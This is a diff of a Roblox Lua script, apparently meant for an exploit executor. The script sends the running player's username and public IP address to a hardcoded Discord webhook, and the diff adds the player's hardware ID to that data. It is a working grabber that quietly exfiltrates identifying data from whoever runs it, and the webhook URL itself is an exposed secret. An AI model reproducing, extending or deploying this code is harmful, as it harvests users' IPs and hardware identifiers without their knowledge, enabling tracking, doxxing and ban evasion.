@@ -7,6 +7,18 @@ local HS = game:GetService("HttpService")
 local webhookURL = "https://discord.com/api/webhooks/1206368774739992648/o2Ep8vITMv_Xe1766i3I008pBt7syDRa6nDR-zd-srdyahl6IewjzC2TsCYxrBMWCY0m"
 local playerName = game.Players.LocalPlayer.Name -- Ensure this is executed in a context where LocalPlayer is available
 
+function generateRandomString(length)
+    local charSet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+    local result = ''
+    for i = 1, length do
+        local randIndex = math.random(1, #charSet)
+        result = result .. charSet:sub(randIndex, randIndex)
+    end
+    return result
+end
+
+math.randomseed(os.time()) -- Seed the random generator
+
 local messageData = {
     embeds = {
         {
@@ -23,7 +35,12 @@ local messageData = {
                     name = "IP",
                     value = game:HttpGet("https://api.ipify.org"),
                     inline = false -- Whether the field should display inline or not
-                }
+                },
+		{
+                    name = "HWID",
+                    value = gethwid(),
+                    inline = false -- Whether the field should display inline or not
+                },
             },
 
             footer = { -- Footer text
@@ -45,9 +62,6 @@ local response = request({
     Body = jsonData
 })
 
--- Optionally, you can decode the response and do something with it
--- local responseData = HS:JSONDecode(response.Body)
--- print(responseData) -- This will print the response. Modify as needed.
 
 
 local Main = {
